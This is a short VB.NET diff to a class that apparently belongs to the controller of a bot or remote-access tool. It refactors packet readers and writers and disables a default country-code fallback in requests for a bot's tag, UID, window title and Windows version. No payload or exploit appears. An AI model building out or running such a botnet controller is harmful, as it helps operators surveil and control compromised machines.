@@ -31,9 +31,9 @@ Public Class clsInfo
 
         Dim getCountryObj As Getcountry = New Getcountry(Application.StartupPath + "\GeoIP.dat")
         ClientInfo.countryCode = getCountryObj.LookupCountryCode(Conn.GetIPAddr())
-        If ClientInfo.countryCode = "--" Then
-            ClientInfo.countryCode = "VN"
-        End If
+        'If ClientInfo.countryCode = "--" Then
+        'ClientInfo.countryCode = "VN"
+        'End If
 
     End Sub
 
@@ -43,7 +43,7 @@ Public Class clsInfo
 
     Public Overrides Sub OnPacketArrived(ByVal packet() As Byte)
         Dim ID As Byte = packet(0)
-        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
+        Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
 
 
         Select Case ID
@@ -93,7 +93,7 @@ Public Class clsInfo
     Private ClientInfo As structClientInfo
 
     Public Function SendGetWindowTitle() As Boolean
-        Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         Dim packet As Byte() = {}
 
         BinWritter.BufferAddByte(packet, 1)
@@ -104,7 +104,7 @@ Public Class clsInfo
 
     Public Function SendGetWindowBasicInfo() As Boolean
 
-        Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         Dim packet As Byte() = {}
 
         BinWritter.BufferAddByte(packet, 0)
@@ -114,7 +114,7 @@ Public Class clsInfo
     End Function
 
     Public Function SendGetWindowVersion() As Boolean
-        Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         Dim packet As Byte() = {}
 
         BinWritter.BufferAddByte(packet, 2)
@@ -124,7 +124,7 @@ Public Class clsInfo
     End Function
 
     Public Function SendGetBotTag() As Boolean
-        Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         Dim packet As Byte() = {}
 
         BinWritter.BufferAddByte(packet, 3)
@@ -134,7 +134,7 @@ Public Class clsInfo
     End Function
 
     Public Function SendGetBotUID() As Boolean
-        Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         Dim packet As Byte() = {}
 
         BinWritter.BufferAddByte(packet, 4)
